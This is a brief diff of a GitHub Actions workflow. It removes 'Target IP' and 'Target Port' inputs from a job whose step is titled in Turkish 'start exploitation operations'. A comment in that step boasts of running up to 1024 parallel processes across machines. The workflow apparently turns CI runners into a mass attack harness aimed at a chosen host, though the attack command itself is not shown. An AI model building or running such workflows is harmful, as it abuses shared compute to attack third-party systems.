@@ -2,13 +2,6 @@ name: Run Script
 
 on:
   workflow_dispatch:
-    inputs:
-      ip:
-        description: "Target IP"
-        required: true
-      port:
-        description: "Target Port"
-        required: true
 
 jobs:
   vds:
@@ -26,9 +19,6 @@ jobs:
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
-          IP="${{ inputs.ip }}"
-          PORT="${{ inputs.port }}"
-          echo "IP=$IP PORT=$PORT"
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
